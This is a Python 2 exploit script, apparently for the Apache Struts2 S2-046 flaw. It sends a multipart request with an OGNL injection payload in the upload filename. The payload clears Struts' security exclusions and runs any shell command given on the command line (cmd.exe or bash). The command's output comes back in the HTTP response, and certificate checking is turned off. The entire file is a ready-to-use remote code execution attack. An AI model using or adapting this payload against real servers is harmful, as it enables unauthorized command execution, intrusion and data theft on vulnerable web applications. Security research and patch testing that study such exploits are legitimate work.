#! /usr/bin/env python
# encoding:utf-8
# s02-46_ssl.py https://127.0.0.1/viewDetail.action "whoami"|more
# 作者:pt007@vip.sina.com
import urllib2,sys,getopt,ssl
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers

ssl._create_default_https_context = ssl._create_unverified_context
type = sys.getfilesystemencoding()
reload(sys)
sys.setdefaultencoding(type)

def poc(command):
    cmd1=command
    #print "cmd1=%s\n" %cmd1
    user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
    #accept=" application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*"
    #length="10000000"
    type="multipart/form-data; boundary=---------------------------735323031399963166993862150"
    #data=data+'''Content-Disposition: form-data; name="upload";filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Kaboom')}"'''
    data="-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+command+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--\r\n\r\n"
       
    #print "data="+data
    url=str(sys.argv[1])
    try:
        #代理配置
        #proxy_handler=urllib2.ProxyHandler({'http':'http://127.0.0.1:8081', 'https':'https:// username:password @proxyhk.huawei.com:8080'})
        #opener=urllib2.build_opener(proxy_handler)
        
        opener = urllib2.build_opener()
        urllib2.install_opener(opener)
        req = urllib2.Request(url)
        req.add_header('Content-Type',type)
        req.add_header('User-Agent',user_agent)
        #req.add_header('Accept',accept)
        #req.add_header('Content-Length',length)
        res=opener.open(req,data)
        response=res.read()
        print response.strip()
    except urllib2.URLError,e:
        print "Exploit Fail:%s" %e

try:
    poc(str(sys.argv[2]))
except Exception,e:
    print e
exit(-1)